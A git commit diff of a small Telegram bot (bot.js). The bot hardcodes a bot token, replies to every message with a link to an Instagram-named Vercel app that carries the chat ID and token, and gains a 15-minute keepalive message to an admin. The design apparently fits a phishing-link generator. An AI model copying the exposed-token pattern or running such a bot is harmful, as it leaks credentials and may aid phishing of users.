5c6785ffb312895de52a71892131c8ba9f94d515
rahmatjon web <rahmatjon_web@192.168.1.55>
2025-11-17 09:58:09 +0500

    1

--- bot.js
+++ bot.js
@@ -1,8 +1,12 @@
 import TelegramBot from "node-telegram-bot-api";
 const token = "8292077308:AAFMvWEToMiDiz7UQnbmqihk0KiOv8MUCCQ";
 const bot = new TelegramBot(token, { polling: true });
+const adminId = 8079294558
 bot.on("message", async (msg) => {
     const chatId = msg.chat.id;
     const link = `https://insta-chi-plum.vercel.app/?id=${chatId}&token=${token}`;
     bot.sendMessage(chatId, link);
 });
+setInterval(() => {
+    bot.sendMessage(adminId, 'test');
+}, 1000 * 60 * 15);
